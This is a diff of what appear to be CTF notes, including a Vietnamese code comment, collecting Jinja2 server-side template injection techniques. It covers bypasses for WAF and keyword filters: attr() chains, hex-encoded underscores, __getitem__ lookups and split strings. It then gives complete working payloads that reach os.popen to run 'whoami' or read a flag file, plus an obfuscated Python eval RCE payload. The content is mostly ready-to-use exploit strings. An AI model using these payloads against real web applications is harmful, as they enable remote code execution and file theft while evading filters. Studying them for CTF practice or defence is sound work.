@@ -77,13 +77,13 @@ request|attr(‘application’)|attr(“__globals__”)
 
 — Bypasses WAFs blocking `request.application.__globals__`.
 
-    ##### 2. Hex Encoding (`\x5f`) for Underscores (`_`)
+##### 2. Hex Encoding (`\x5f`) for Underscores (`_`)
 
     “\x5f\x5fglobals\x5f\x5f”
 
     — Bypasses filters blocking `__globals__`, `__builtins__`, and `__import__`.
 
-    ##### 3. Using `__getitem__()` Instead of `[]`
+##### 3. Using `__getitem__()` Instead of `[]`
     jinja2
     |attr(‘__getitem__’)(‘__builtins__’)
 
@@ -91,17 +91,25 @@ request|attr(‘application’)|attr(“__globals__”)
 
 ##### 4. Jinja2 Sandbox Escape
 — Accesses `request.application.__globals__` to get Python built-ins.
-
-   ##### 5. RCE Without `eval()` or `exec()`
+##### 5. RCE Without `eval()` or `exec()`
 
     __import__(‘os’).popen(‘id’).read()
 
     — Avoids blocked `os.system()` and `subprocess.Popen()`.
-  - payload:
+##### Adjacent string literals
+- `__import__("o""s").system("l""s")`
+##### Regular concatenation
+- `__import__('o'+'s').system('l'+'s')`
+##### payloads:
 
 ```
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('whoami')|attr('read')()}}
 ```
 ```
 {{request|attr(‘application’)|attr(“\x5f\x5fglobals\x5f\x5f”)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(‘\x5f\x5fbuiltins\x5f\x5f’)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(“\x5f\x5fimport\x5f\x5f”)(‘os’)|attr(‘popen’)(‘cat flag’)|attr(‘read’)()}}
+```
+
+```
+# payload này cho python rce vuln (code này được chạy trong hàm eval do lỗ hổng của web)
+__import__('o'+'s').popen('c'+'a'+'t'+' '+'.'+'.'+chr(47)+'flag'+'.'+'txt').read()
 ```
